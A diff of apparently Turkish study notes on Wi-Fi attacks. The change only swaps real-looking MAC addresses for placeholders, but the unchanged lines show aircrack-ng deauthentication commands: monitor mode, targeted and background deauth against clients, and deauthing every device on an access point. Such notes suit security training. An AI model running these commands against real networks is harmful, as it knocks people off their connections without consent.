@@ -24,13 +24,13 @@ ifconfig wlan0 up
   Deauth Saldırıları:
 airmon-ng start wlan0	-> Monitor moda geçiş yaptık.
 airodump-ng wlan0mon	-> Etraftan gelen giden paketleri dinlemeyi başlatıyoruz.
-airodump-ng --bssid 88:41:FC:19:B4:5B --channel 11 wlan0mon
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 06:E9:84:18:81:A3 wlan0mon
+airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 11 wlan0mon
+aireplay-ng --deauth 1000 -a AA:BB:CC:DD:EE:FF -c AA:BB:CC:DD:EE:FF wlan0mon
 
 
   Aynı anda 2 cihaza Deauth saldırısı yapmak:
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 06:E9:84:18:81:A3 wlan0mon &> /dev/null& -> Arka planda deauth saldırımız çalışıyor ve aynı zamanda &(ve) işareti kullanarak outputumuzu başka bir yere (null klasörüne yani boşluğa) yönledirdik.
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 66:51:87:86:23:59 wlan0mon &> /dev/null&
+aireplay-ng --deauth 1000 -a AA:BB:CC:DD:EE:FF -c AA:BB:CC:DD:EE:FF wlan0mon &> /dev/null& -> Arka planda deauth saldırımız çalışıyor ve aynı zamanda &(ve) işareti kullanarak outputumuzu başka bir yere (null klasörüne yani boşluğa) yönledirdik.
+aireplay-ng --deauth 1000 -a AA:BB:CC:DD:EE:FF -c AA:BB:CC:DD:EE:FF wlan0mon &> /dev/null&
 
 
   Arka planda çalışan işlemleri görüntülemek için:
@@ -41,10 +41,10 @@ killall aireplay-ng -> tüm işlemleri durdurur.
 
 
 	Tüm Cihazları Yetkisizlendirmek
-aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B wlan0mon
+aireplay-ng --deauth 1000 -a AA:BB:CC:DD:EE:FF wlan0mon
 
  No Such BSSID available hatası alırsak	:
-airodump-ng --bssid 88:41:FC:19:B4:5B --channel 11 wlan0mon
+airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 11 wlan0mon
  ...komutu ile aynı anda çalıştır.
 
 
